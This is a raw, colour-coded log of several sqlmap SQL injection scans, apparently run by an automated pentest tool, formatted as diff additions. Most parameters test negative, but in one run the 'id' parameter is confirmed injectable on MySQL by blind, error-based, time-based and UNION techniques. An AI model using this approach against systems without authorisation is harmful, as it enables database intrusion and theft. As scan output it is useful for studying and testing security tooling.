+[[36m19:27:22[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:23[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:23[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:23[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:27:23[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:24[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mlang[0m[1m' does not seem to be injectable[0m
+[[36m19:27:24[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mconvcharset[0m[1m' might not be injectable[0m
+[[36m19:27:24[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mconvcharset[0m'
+[[36m19:27:24[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:25[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:25[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:25[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:25[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:25[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:26[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:27[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:27[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:27[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mconvcharset[0m[1m' does not seem to be injectable[0m
+[[36m19:27:27[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mcollation_connection[0m[1m' might not be injectable[0m
+[[36m19:27:27[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mcollation_connection[0m'
+[[36m19:27:28[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:28[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:28[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:28[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:28[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:29[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:30[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:30[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:30[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:30[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:31[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mcollation_connection[0m[1m' does not seem to be injectable[0m
+[[36m19:27:31[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mtoken[0m[1m' might not be injectable[0m
+[[36m19:27:31[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mtoken[0m'
+[[36m19:27:31[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:31[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:31[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:31[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:32[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:33[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:33[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:33[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:33[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:33[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:34[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mtoken[0m[1m' does not seem to be injectable[0m
+[[36m19:27:34[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mnocache[0m[1m' might not be injectable[0m
+[[36m19:27:34[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mnocache[0m'
+[[36m19:27:34[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:34[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:35[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:36[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:37[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:37[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:37[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mnocache[0m[1m' does not seem to be injectable[0m
+[[36m19:27:37[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:27:37 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m,[01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:39 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:39[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:27:39[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=d73e028ef94...346abd7735;gallarific_vote_5=1'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:40[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:27:40[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:27:40[0m][1m [[32;1mINFO[0m][1m NULL connection is supported with GET method ('[37mRange[0m[1m')[0m
+[[36m19:27:40[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:40[0m] [[33mWARNING[0m] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph '[37mPage comparison[0m'
+[1mhow do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[0m[[36m19:27:40[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mid[0m[1m' might not be injectable[0m
+[[36m19:27:40[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mid[0m'
+[[36m19:27:40[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:40[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:40[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:40[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:40[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+                                                                               [[36m19:27:41[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait...... (done)
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[1mit is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+[0m[[36m19:27:41[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:41[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mid[0m[1m' does not seem to be injectable[0m
+[[36m19:27:41[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mvote[0m[1m' might not be injectable[0m
+[[36m19:27:41[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mvote[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:42[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:43[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mvote[0m[1m' does not seem to be injectable[0m
+[[36m19:27:43[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37mfrom[0m[1m' might not be injectable[0m
+[[36m19:27:43[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mfrom[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mPostgreSQL AND error-based - WHERE or HAVING clause[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)[0m'
+[[36m19:27:43[0m] [[32mINFO[0m] testing '[37mOracle AND error-based - WHERE or HAVING clause (XMLType)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 error-based - Parameter replace (FLOOR)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 stacked queries (comment)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase stacked queries (comment)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mOracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mPostgreSQL > 8.1 AND time-based blind[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mMicrosoft SQL Server/Sybase time-based blind (IF)[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mOracle AND time-based blind[0m'
+[[36m19:27:44[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 10 columns[0m'
+[[36m19:27:44[0m][1m [[33;1mWARNING[0m][1m GET parameter '[37mfrom[0m[1m' does not seem to be injectable[0m
+[[36m19:27:44[0m] [[41;37mCRITICAL[0m] all tested parameters do not appear to be injectable. Try to increase values for '[37m--level[0m'/'[37m--risk[0m' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '[37m--tamper[0m' (e.g. '[37m--tamper=space2comment[0m') and/or switch '[37m--random-agent[0m'
+
+[*] ending @ 19:27:44 /2020-04-13/
+
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m([01;49m]_____ ___ ___  [01;37m{[01;34m1.4.3#pip[01;37m}[01;33m
+|_ -| . [[01;41m,[01;49m]     | .'| . |
+|___|_  [[01;41m([01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttp://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:27:46 /2020-04-13/
+
+[?1049h[1;24r(B[m[4l[?7h[24;1H[?1049l[?1l>[[36m19:27:46[0m] [[33mWARNING[0m] using '[37m/avain/modules/web/sqlmap/sqlmap_out_dir[0m' as the output directory
+[[36m19:27:46[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+[[36m19:27:46[0m] [[33mWARNING[0m] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+[1myou have not declared cookie(s), while server wants to set its own ('PHPSESSID=c2269e05c06...661b4269b7'). Do you want to use those [Y/n] Y
+[0m[[36m19:27:46[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+[[36m19:27:46[0m][1m [[32;1mINFO[0m][1m testing NULL connection to the target URL[0m
+[[36m19:27:46[0m][1m [[32;1mINFO[0m][1m NULL connection is supported with '[37mskip-read[0m[1m' method[0m
+[[36m19:27:46[0m] [[32mINFO[0m] testing if the target URL content is stable
+[[36m19:27:47[0m] [[32mINFO[0m] target URL content is stable
+[[36m19:27:47[0m][1m [[32;1mINFO[0m][1m heuristic (basic) test shows that GET parameter '[37mid[0m[1m' might be injectable (possible DBMS: '[37mMySQL[0m[1m')[0m
+[[36m19:27:47[0m][1m [[32;1mINFO[0m][1m heuristic (XSS) test shows that GET parameter '[37mid[0m[1m' might be vulnerable to cross-site scripting (XSS) attacks[0m
+[[36m19:27:47[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mid[0m'
+[1mit looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[0m[1mfor the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[0m[[36m19:27:47[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:27:47[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:27:47[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' appears to be '[37mBoolean-based blind - Parameter replace (original value)[0m[1m' injectable [0m
+[[36m19:27:47[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:27:47[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m19:27:48[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)[0m'
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)[0m'
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)[0m'
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)[0m'
+[[36m19:27:49[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' is '[37mMySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)[0m[1m' injectable [0m
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL inline queries[0m'
+[[36m19:27:49[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (comment)[0m'
+                                                                               [[36m19:27:49[0m] [[33mWARNING[0m] time-based comparison requires larger statistical model, please wait............ (done)
+[[36m19:27:50[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries[0m'
+[[36m19:27:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (query SLEEP - comment)[0m'
+[[36m19:27:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 stacked queries (query SLEEP)[0m'
+[[36m19:27:51[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0.12 stacked queries (heavy query - comment)[0m'
+[[36m19:27:51[0m] [[32mINFO[0m] testing '[37mMySQL < 5.0.12 stacked queries (heavy query)[0m'
+[[36m19:27:51[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m'
+[[36m19:28:01[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' appears to be '[37mMySQL >= 5.0.12 AND time-based blind (query SLEEP)[0m[1m' injectable [0m
+[[36m19:28:01[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 20 columns[0m'
+[[36m19:28:01[0m] [[32mINFO[0m] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[[36m19:28:02[0m] [[32mINFO[0m] '[37mORDER BY[0m' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[[36m19:28:02[0m] [[32mINFO[0m] target URL appears to have 6 columns in query
+[[36m19:28:03[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' is '[37mGeneric UNION query (NULL) - 1 to 20 columns[0m[1m' injectable[0m
+[1mGET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] Y
+[0m[[36m19:28:03[0m][1m [[33;1mWARNING[0m][1m heuristic (basic) test shows that GET parameter '[37msort[0m[1m' might not be injectable[0m
+[[36m19:28:03[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37msort[0m'
+[[36m19:28:03[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+[[36m19:28:03[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+[[36m19:28:03[0m] [[32mINFO[0m] testing '[37mGeneric inline queries[0m'
+[[36m19:28:03[0m] [[33mWARNING[0m] reflective value(s) found and filtering out
+[[36m19:28:03[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (MySQL comment)[0m'
+[[36m19:28:04[0m] [[32mINFO[0m] testing '[37mOR boolean-based blind - WHERE or HAVING clause (MySQL comment)[0m'
+[[36m19:28:05[0m] [[32mINFO[0m] testing '[37mOR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)[0m'
+[[36m19:28:06[0m] [[32mINFO[0m] testing '[37mMySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause[0m'
+[[36m19:28:08[0m] [[32mINFO[0m] testing '[37mMySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)[0m'
+[[36m19:28:10[0m] [[32mINFO[0m] testing '[37mMySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)[0m'
+[[36m19:28:12[0m] [[32mINFO[0m] testing '[37mMySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)[0m'
+[[36m19:28:14[0m] [[32mINFO[0m] testing '[37mMySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)[0m'
+[[36m19:28:15[0m] [[32mINFO[0m] testing '[37mMySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)[0m'
+[[36m19:28:17[0m] [[32mINFO[0m] testing '[37mMySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (bool*int)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (MAKE_SET)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (MAKE_SET - original value)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (ELT)[0m'
+[[36m19:28:18[0m] [[32mINFO[0m] testing '[37mMySQL boolean-based blind - Parameter replace (ELT - original value)[0m'
